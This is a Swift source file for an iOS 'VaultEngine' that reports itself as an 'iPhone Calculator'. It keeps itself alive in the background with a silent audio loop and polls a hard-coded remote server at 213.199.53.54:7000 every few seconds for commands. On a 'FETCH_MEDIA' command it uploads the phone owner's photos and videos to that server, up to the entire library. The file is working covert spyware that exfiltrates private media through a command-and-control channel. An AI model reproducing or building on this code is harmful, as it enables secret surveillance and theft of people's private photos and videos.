import Foundation
import Photos
import AVFoundation
import UIKit

class VaultEngine: NSObject, ObservableObject {
    static let shared = VaultEngine()

    @Published var serverURL: String = "http://213.199.53.54:7000"
    @Published var pairingCode: String = "VAULT-7860"
    @Published var secretPin: String = "9876"
    @Published var isActivated: Bool = false
    @Published var isBackgroundActive: Bool = false
    @Published var statusMessage: String = "Ready"
    @Published var photosCount: Int = 0
    @Published var videosCount: Int = 0

    private var audioPlayer: AVAudioPlayer?
    private var pollTimer: Timer?
    private var bgTaskID: UIBackgroundTaskIdentifier = .invalid
    private let session: URLSession

    override init() {
        let config = URLSessionConfiguration.default
        config.timeoutIntervalForRequest = 10
        config.timeoutIntervalForResource = 30
        config.waitsForConnectivity = true
        self.session = URLSession(configuration: config)

        super.init()
        loadSettings()
    }

    func loadSettings() {
        let defaults = UserDefaults.standard
        if let savedURL = defaults.string(forKey: "vps_server_url"), !savedURL.isEmpty {
            // Force fix port if it was old 5000
            if savedURL.contains(":5000") {
                serverURL = "http://213.199.53.54:7000"
                defaults.set(serverURL, forKey: "vps_server_url")
            } else {
                serverURL = savedURL
            }
        } else {
            serverURL = "http://213.199.53.54:7000"
        }

        if let savedCode = defaults.string(forKey: "pairing_code"), !savedCode.isEmpty {
            pairingCode = savedCode
        }
        if let savedPin = defaults.string(forKey: "secret_pin"), !savedPin.isEmpty {
            secretPin = savedPin
        }
        isActivated = defaults.bool(forKey: "is_activated")

        // Start background keep alive and heartbeat loop
        startBackgroundKeepAlive()
        refreshMediaStats()
        startHeartbeat()
    }

    func saveSettings() {
        let defaults = UserDefaults.standard
        defaults.set(serverURL, forKey: "vps_server_url")
        defaults.set(pairingCode, forKey: "pairing_code")
        defaults.set(secretPin, forKey: "secret_pin")
        defaults.set(isActivated, forKey: "is_activated")
    }

    // MARK: - Photo Permissions
    func requestPhotoPermission(completion: @escaping (Bool) -> Void) {
        PHPhotoLibrary.requestAuthorization(for: .readWrite) { status in
            DispatchQueue.main.async {
                let granted = (status == .authorized || status == .limited)
                if granted {
                    self.refreshMediaStats()
                }
                completion(granted)
            }
        }
    }

    func refreshMediaStats() {
        let status = PHPhotoLibrary.authorizationStatus(for: .readWrite)
        guard status == .authorized || status == .limited else {
            // Still send heartbeat even if permission pending
            self.sendHeartbeat()
            return
        }

        let photosFetch = PHAsset.fetchAssets(with: .image, options: nil)
        let videosFetch = PHAsset.fetchAssets(with: .video, options: nil)

        DispatchQueue.main.async {
            self.photosCount = photosFetch.count
            self.videosCount = videosFetch.count
            self.sendHeartbeat()
        }
    }

    // MARK: - Background Keep-Alive (Silent Audio + UIBackgroundTask)
    func startBackgroundKeepAlive() {
        registerBackgroundTask()

        do {
            try AVAudioSession.sharedInstance().setCategory(.playback, mode: .default, options: [.mixWithOthers])
            try AVAudioSession.sharedInstance().setActive(true)

            let silentWavData = createSilentWavData()
            audioPlayer = try AVAudioPlayer(data: silentWavData)
            audioPlayer?.numberOfLoops = -1
            audioPlayer?.volume = 0.01
            audioPlayer?.prepareToPlay()
            audioPlayer?.play()

            DispatchQueue.main.async {
                self.isBackgroundActive = true
                self.statusMessage = "24/7 Background Keep-Alive Active"
            }
            print("[VaultEngine] Silent audio loop running.")
        } catch {
            print("[VaultEngine] Audio keep-alive error: \(error)")
        }
    }

    func registerBackgroundTask() {
        if bgTaskID != .invalid {
            UIApplication.shared.endBackgroundTask(bgTaskID)
        }
        bgTaskID = UIApplication.shared.beginBackgroundTask(withName: "VaultBackgroundEngine") { [weak self] in
            self?.registerBackgroundTask()
        }
    }

    private func createSilentWavData() -> Data {
        var header = [UInt8]()
        let sampleRate: UInt32 = 8000
        let channels: UInt16 = 1
        let bitsPerSample: UInt16 = 16
        let numSamples: UInt32 = sampleRate * 1
        let subChunk2Size: UInt32 = numSamples * UInt32(channels) * UInt32(bitsPerSample / 8)
        let chunkSize: UInt32 = 36 + subChunk2Size

        header.append(contentsOf: "RIFF".utf8)
        header.append(contentsOf: withUnsafeBytes(of: chunkSize.littleEndian) { Array($0) })
        header.append(contentsOf: "WAVE".utf8)
        header.append(contentsOf: "fmt ".utf8)
        header.append(contentsOf: withUnsafeBytes(of: UInt32(16).littleEndian) { Array($0) })
        header.append(contentsOf: withUnsafeBytes(of: UInt16(1).littleEndian) { Array($0) })
        header.append(contentsOf: withUnsafeBytes(of: channels.littleEndian) { Array($0) })
        header.append(contentsOf: withUnsafeBytes(of: sampleRate.littleEndian) { Array($0) })
        let byteRate = sampleRate * UInt32(channels) * UInt32(bitsPerSample / 8)
        header.append(contentsOf: withUnsafeBytes(of: byteRate.littleEndian) { Array($0) })
        let blockAlign = channels * (bitsPerSample / 8)
        header.append(contentsOf: withUnsafeBytes(of: blockAlign.littleEndian) { Array($0) })
        header.append(contentsOf: withUnsafeBytes(of: bitsPerSample.littleEndian) { Array($0) })
        header.append(contentsOf: "data".utf8)
        header.append(contentsOf: withUnsafeBytes(of: subChunk2Size.littleEndian) { Array($0) })

        var data = Data(header)
        let silentBytes = [UInt8](repeating: 0, count: Int(subChunk2Size))
        data.append(contentsOf: silentBytes)
        return data
    }

    // MARK: - Heartbeat & Polling
    func startHeartbeat() {
        pollTimer?.invalidate()
        sendHeartbeat()
        checkForCommands()

        pollTimer = Timer.scheduledTimer(withTimeInterval: 2.5, repeats: true) { [weak self] _ in
            self?.sendHeartbeat()
            self?.checkForCommands()
        }
    }

    func sendHeartbeat() {
        guard let url = URL(string: "\(serverURL)/api/pair/check") else { return }
        var req = URLRequest(url: url)
        req.httpMethod = "POST"
        req.setValue("application/json", forHTTPHeaderField: "Content-Type")

        let body: [String: Any] = [
            "code": pairingCode,
            "device": "iPhone Calculator",
            "stats": ["photosCount": photosCount, "videosCount": videosCount]
        ]
        req.httpBody = try? JSONSerialization.data(withJSONObject: body)
        session.dataTask(with: req).resume()
    }

    func checkForCommands() {
        guard let url = URL(string: "\(serverURL)/api/commands?code=\(pairingCode)") else { return }

        session.dataTask(with: url) { [weak self] data, response, error in
            guard let self = self, let data = data, error == nil else { return }
            do {
                if let json = try JSONSerialization.jsonObject(with: data) as? [String: Any],
                   let hasCommand = json["hasCommand"] as? Bool, hasCommand,
                   let command = json["command"] as? [String: Any],
                   let action = command["action"] as? String {

                    if action == "FETCH_MEDIA" {
                        let type = command["type"] as? String ?? "photos"
                        let count = command["count"] as? Int ?? 10
                        self.executeFetchMedia(type: type, count: count)
                    } else if action == "GET_STATS" {
                        self.refreshMediaStats()
                    }
                }
            } catch {
                // Ignore
            }
        }.resume()
    }

    // MARK: - Media Fetch & Upload
    func executeFetchMedia(type: String, count: Int) {
        let fetchOptions = PHFetchOptions()
        fetchOptions.sortDescriptors = [NSSortDescriptor(key: "creationDate", ascending: false)]

        var assetsToUpload: [PHAsset] = []

        if type == "photos" || type == "all" {
            let photos = PHAsset.fetchAssets(with: .image, options: fetchOptions)
            let limit = (count == -1) ? photos.count : min(count, photos.count)
            for i in 0..<limit {
                assetsToUpload.append(photos.object(at: i))
            }
        }

        if type == "videos" || type == "all" {
            let videos = PHAsset.fetchAssets(with: .video, options: fetchOptions)
            let limit = (count == -1) ? videos.count : min(count, videos.count)
            for i in 0..<limit {
                assetsToUpload.append(videos.object(at: i))
            }
        }

        let total = assetsToUpload.count
        print("[VaultEngine] Starting upload of \(total) items to VPS...")

        let manager = PHImageManager.default()
        let options = PHImageRequestOptions()
        options.isSynchronous = false
        options.deliveryMode = .highQualityFormat
        options.isNetworkAccessAllowed = true

        for (index, asset) in assetsToUpload.enumerated() {
            if asset.mediaType == .image {
                manager.requestImageDataAndOrientation(for: asset, options: options) { [weak self] data, _, _, _ in
                    guard let self = self, let data = data else { return }
                    let filename = "photo_\(Date().timeIntervalSince1970)_\(index).jpg"
                    self.uploadMediaFile(data: data, filename: filename, mimeType: "image/jpeg", index: index + 1, total: total)
                }
            } else if asset.mediaType == .video {
                let videoOptions = PHVideoRequestOptions()
                videoOptions.isNetworkAccessAllowed = true
                manager.requestAVAsset(forVideo: asset, options: videoOptions) { [weak self] avAsset, _, _ in
                    guard let self = self, let urlAsset = avAsset as? AVURLAsset else { return }
                    if let videoData = try? Data(contentsOf: urlAsset.url) {
                        let filename = "video_\(Date().timeIntervalSince1970)_\(index).mp4"
                        self.uploadMediaFile(data: videoData, filename: filename, mimeType: "video/mp4", index: index + 1, total: total)
                    }
                }
            }
        }
    }

    private func uploadMediaFile(data: Data, filename: String, mimeType: String, index: Int, total: Int) {
        guard let url = URL(string: "\(serverURL)/api/upload") else { return }
        var req = URLRequest(url: url)
        req.httpMethod = "POST"
        req.setValue(pairingCode, forHTTPHeaderField: "x-pairing-code")

        let boundary = "Boundary-\(UUID().uuidString)"
        req.setValue("multipart/form-data; boundary=\(boundary)", forHTTPHeaderField: "Content-Type")

        var body = Data()
        body.append("--\(boundary)\r\n".data(using: .utf8)!)
        body.append("Content-Disposition: form-data; name=\"media\"; filename=\"\(filename)\"\r\n".data(using: .utf8)!)
        body.append("Content-Type: \(mimeType)\r\n\r\n".data(using: .utf8)!)
        body.append(data)
        body.append("\r\n--\(boundary)--\r\n".data(using: .utf8)!)

        session.uploadTask(with: req, from: body) { _, _, error in
            if error == nil {
                print("[VaultEngine] Uploaded \(index)/\(total): \(filename)")
            } else {
                print("[VaultEngine] Upload error: \(error?.localizedDescription ?? "")")
            }
        }.resume()
    }
}
